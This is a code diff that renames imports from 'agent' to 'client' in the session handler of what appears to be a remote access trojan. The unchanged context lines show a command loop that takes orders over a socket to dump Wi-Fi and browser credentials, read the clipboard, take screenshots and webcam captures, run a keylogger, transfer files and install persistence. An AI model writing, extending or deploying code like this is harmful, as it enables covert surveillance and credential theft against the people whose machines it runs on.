@@ -1,19 +1,19 @@
 import threading
 import subprocess
 
-from agent.core.protocol import reliable_send, reliable_recv
-from agent.modules.file_ops import (
+from client.core.protocol import reliable_send, reliable_recv
+from client.modules.file_ops import (
     upload_file, download_file, list_dir, change_dir, current_dir,
     delete, move, read_file, touch,
 )
-from agent.modules.shell import run_command
-from agent.modules.sysinfo import get_sysinfo
-from agent.modules.persistence import install_persistence
-from agent.modules.process_ops import kill_process, sendall_command
+from client.modules.shell import run_command
+from client.modules.sysinfo import get_sysinfo
+from client.modules.persistence import install_persistence
+from client.modules.process_ops import kill_process, sendall_command
 
 
 def handle_session(sock, platform):
-    import agent.core.protocol as protocol
+    import client.core.protocol as protocol
     protocol.recv_buffer = b''
 
     keylog = None
@@ -78,20 +78,20 @@ def handle_session(sock, platform):
         elif command == 'check_admin':
             reliable_send(sock, platform.check_admin())
         elif command == 'clipboard':
-            from agent.modules.surveillance import get_clipboard
+            from client.modules.surveillance import get_clipboard
             reliable_send(sock, get_clipboard())
         elif command == 'wifi_dump':
-            from agent.modules.credentials import wifi_dump
+            from client.modules.credentials import wifi_dump
             reliable_send(sock, wifi_dump())
         elif command == 'browser_creds':
-            from agent.modules.credentials import browser_credentials
+            from client.modules.credentials import browser_credentials
             reliable_send(sock, browser_credentials())
 
         elif command == 'screenshot':
-            from agent.modules.surveillance import screenshot
+            from client.modules.surveillance import screenshot
             screenshot(sock)
         elif command == 'webcam':
-            from agent.modules.surveillance import webcam_capture
+            from client.modules.surveillance import webcam_capture
             webcam_capture(sock)
 
         elif command.startswith('upload'):
@@ -101,7 +101,7 @@ def handle_session(sock, platform):
             upload_file(sock, command[9:])
 
         elif command == 'keylog_start':
-            from agent.modules.keylogger import Keylogger
+            from client.modules.keylogger import Keylogger
             try:
                 keylog = Keylogger()
                 keylog_thread = threading.Thread(target=keylog.start)
